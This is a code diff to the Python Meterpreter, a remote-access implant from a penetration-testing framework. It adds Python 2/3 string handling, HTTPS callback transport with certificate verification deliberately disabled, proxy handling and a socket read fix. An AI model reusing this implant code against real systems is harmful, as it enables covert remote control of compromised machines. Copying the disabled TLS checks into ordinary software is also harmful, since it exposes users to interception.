@@ -41,6 +41,7 @@ if sys.version_info[0] < 3:
 	is_bytes = lambda obj: issubclass(obj.__class__, str)
 	bytes = lambda *args: str(*args[:1])
 	NULL_BYTE = '\x00'
+	unicode = lambda x: (x.decode('UTF-8') if isinstance(x, str) else x)
 else:
 	if isinstance(__builtins__, dict):
 		is_str = lambda obj: issubclass(obj.__class__, __builtins__['str'])
@@ -51,6 +52,7 @@ else:
 	is_bytes = lambda obj: issubclass(obj.__class__, bytes)
 	NULL_BYTE = bytes('\x00', 'UTF-8')
 	long = int
+	unicode = lambda x: (x.decode('UTF-8') if isinstance(x, bytes) else x)
 
 #
 # Constants
@@ -262,7 +264,9 @@ def tlv_pack(*args):
 		data = struct.pack('>II', 9, tlv['type']) + bytes(chr(int(bool(tlv['value']))), 'UTF-8')
 	else:
 		value = tlv['value']
-		if not is_bytes(value):
+		if sys.version_info[0] < 3 and value.__class__.__name__ == 'unicode':
+			value = value.encode('UTF-8')
+		elif not is_bytes(value):
 			value = bytes(value, 'UTF-8')
 		if (tlv['type'] & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING:
 			data = struct.pack('>II', 8 + len(value) + 1, tlv['type']) + value + NULL_BYTE
@@ -389,11 +393,17 @@ class PythonMeterpreter(object):
 			print(msg)
 
 	def driver_init_http(self):
+		opener_args = []
+		scheme = HTTP_CONNECTION_URL.split(':', 1)[0]
+		if scheme == 'https' and ((sys.version_info[0] == 2 and sys.version_info >= (2,7,9)) or sys.version_info >= (3,4,3)):
+			import ssl
+			ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
+			ssl_ctx.check_hostname=False
+			ssl_ctx.verify_mode=ssl.CERT_NONE
+			opener_args.append(urllib.HTTPSHandler(0, ssl_ctx))
 		if HTTP_PROXY:
-			proxy_handler = urllib.ProxyHandler({'http': HTTP_PROXY})
-			opener = urllib.build_opener(proxy_handler)
-		else:
-			opener = urllib.build_opener()
+			opener_args.append(urllib.ProxyHandler({scheme: HTTP_PROXY}))
+		opener = urllib.build_opener(*opener_args)
 		if HTTP_USER_AGENT:
 			opener.addheaders = [('User-Agent', HTTP_USER_AGENT)]
 		urllib.install_opener(opener)
@@ -479,7 +489,7 @@ class PythonMeterpreter(object):
 			pkt_length -= 8
 			packet = bytes()
 			while len(packet) < pkt_length:
-				packet += self.socket.recv(4096)
+				packet += self.socket.recv(pkt_length - len(packet))
 		return packet
 
 	def send_packet_tcp(self, packet):
